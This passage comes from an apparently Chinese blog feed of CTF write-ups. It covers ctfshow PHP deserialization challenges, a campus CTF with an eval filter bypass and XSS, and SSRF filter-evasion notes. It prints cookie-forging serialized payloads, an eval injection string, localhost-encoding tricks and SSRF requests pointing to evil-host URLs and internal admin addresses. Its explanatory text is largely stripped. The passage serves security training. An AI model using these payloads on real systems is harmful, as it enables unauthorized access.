single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ctfShowUser</strong><code>$username$password$isVip</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>cookiecookieuserGETusernamepasswordcookie<code>public $isVip=false;public function checkVip()&#123;        return $this-&gt;isVip;    &#125;</code>checkvipcookieuser</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code><br><img src="https://img-blog.csdnimg.cn/232c87cffaf54618987f47609eea9756.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/8ad56eb636804a2d8bb55c4f918fe918.png" alt="2">flag</p><h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-02 17:44:47# @Last Modified by:   h1xa# @Last Modified time: 2020-12-02 19:29:02# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">!==</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>if($this-&gt;username!==$this-&gt;password)</code>usernamepassword</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'dfgh'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A8%3A%22username%22%3Bs%3A4%3A%22dfgh%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3B%7D</code><br></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF</title>
      <link href="/2023/03/04/%E5%8D%97%E4%BA%AC%E6%A3%AE%E6%9E%97%E8%AD%A6%E5%AF%9F%E5%AD%A6%E9%99%A2CTF/"/>
      <url>/2023/03/04/%E5%8D%97%E4%BA%AC%E6%A3%AE%E6%9E%97%E8%AD%A6%E5%AF%9F%E5%AD%A6%E9%99%A2CTF/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p><img src="https://img-blog.csdnimg.cn/f5b19dbc39a34b3e9bf5650b3795ae5e.png" alt="1"><br><br><img src="https://img-blog.csdnimg.cn/755c10249c564270ab3d4f00f01c7b07.png" alt="2"><br><br><img src="https://img-blog.csdnimg.cn/6938f6a4f37345738d5975c6a384ccc4.png" alt="3"><br>&#x2F;vbnp.php<br></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\$'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>t</strong>  ,<strong>r</strong>   ,<strong>n</strong>,  <strong></strong>  ,<strong></strong>,  <strong>&#96;</strong>,  <strong>[</strong>,  <strong>]</strong>,  <strong>$</strong>,  *<em>*</em>,  <strong>^</strong></p><blockquote><p>var_dump() <br>var_dump() <br>Scandir()  </p></blockquote><p>**?num&#x3D;var_dump(scandir(chr(47)))**var_dump(&#x2F;)flag</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><img src="https://img-blog.csdnimg.cn/53061123fbfa4e4983c58136f462d8f0.png" alt="1"><br><br><img src="https://img-blog.csdnimg.cn/3e31a950eef94314959c25f74b06896c.png" alt="25"><br>dirsearch<br><img src="https://img-blog.csdnimg.cn/5c19ee13d99a4795b1a6fbc952613dec.png" alt="3"><br></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//error_reporting(0);</span><span class="token comment">//</span><span class="token variable">$site_root</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/NFPC"</span><span class="token punctuation">;</span><span class="token comment">//</span><span class="token variable">$UPLOAD_ADDR</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"../upload/"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/f6421facbd144e92b789f7a2415345d8.png" alt="5"><br><br><img src="https://img-blog.csdnimg.cn/af5a997fc70e43bf804179d0905dd5bc.png" alt="6"><br>xss<br><img src="https://img-blog.csdnimg.cn/476ec9c4fb6d4fd6977334c8f528999e.png" alt="7"><br>script<br><img src="https://img-blog.csdnimg.cn/d5a6de988010492882ada878665ac939.png" alt="2"><strong>&lt;&gt;<strong><br><img src="https://img-blog.csdnimg.cn/6e25dae7e7734c799d07bd78fc542e68.png" alt="6"><br></strong>WAxiangxiangzuichaofan&#x2F;flag</strong><br>foremost<br><img src="https://img-blog.csdnimg.cn/6d40bf494d20431aa41b44c8025e13df.png" alt="9">    </p><blockquote><pre><code>-V--t--t jpegpdf-d-UNIX-i-stdin-a--w--o--c-forest.conf-q-512-Q--v-</code></pre></blockquote><p>flag<br><img src="https://img-blog.csdnimg.cn/09154bd7f7ab4779b08279e726f80343.png" alt="12"></p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-SSRF</title>
      <link href="/2023/03/02/ctfshow-SSRF/"/>
      <url>/2023/03/02/ctfshow-SSRF/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p><strong>127.0.0.1</strong><strong>127.1</strong> <strong>0</strong> <strong>0.0.0.0</strong>  <strong>sudo.cc</strong> <strong>017700000001</strong> <strong>2130706433</strong> url</p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>URL</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">URL</span><span class="token constant">URL</span><span class="token number">1</span>@ <span class="token constant">URL</span>      <span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>expected<span class="token operator">-</span><span class="token function">host</span><span class="token punctuation">(</span><span class="token punctuation">)</span>@evil<span class="token operator">-</span><span class="token function">host</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token number">2</span> #  <span class="token constant">URL</span>     https<span class="token comment">//evil-host()#expected-host()</span><span class="token number">3</span><span class="token constant">DNS</span><span class="token constant">DNS</span>    <span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>expected<span class="token operator">-</span>host<span class="token punctuation">.</span>evil<span class="token operator">-</span>host<span class="token number">4</span><span class="token constant">URL</span><span class="token constant">URL</span><span class="token constant">HTTP</span><span class="token constant">URL</span><span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="-SSRF-"><a href="#-SSRF-" class="headerlink" title=" SSRF "></a> SSRF </h3><p></p><p> SSRF  URL  SSRF  URL  HTTP  API  URL</p><p> URL</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;product&#x2F;nextProduct?currentProductId&#x3D;6&amp;path&#x3D;http:&#x2F;&#x2F;evil-user.net<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;evil-user.net<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>URLSSRF</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;product&#x2F;stock HTTP&#x2F;1.0 Content-Type: application&#x2F;x-www-form-urlencoded Content-Length: 118 stockApi&#x3D;http:&#x2F;&#x2F;weliketoshop.net&#x2F;product&#x2F;nextProduct?currentProductId&#x3D;6&amp;path&#x3D;http:&#x2F;&#x2F;192.168.0.68&#x2F;admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> SSRF <code>stockAPI</code>URL  URL URL </p><h2 id="352-353"><a href="#352-353" class="headerlink" title="352 353"></a>352 353</h2><p><strong>352</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|127.0.0/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> hacker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>353</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|127\.0\.|\/i'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token 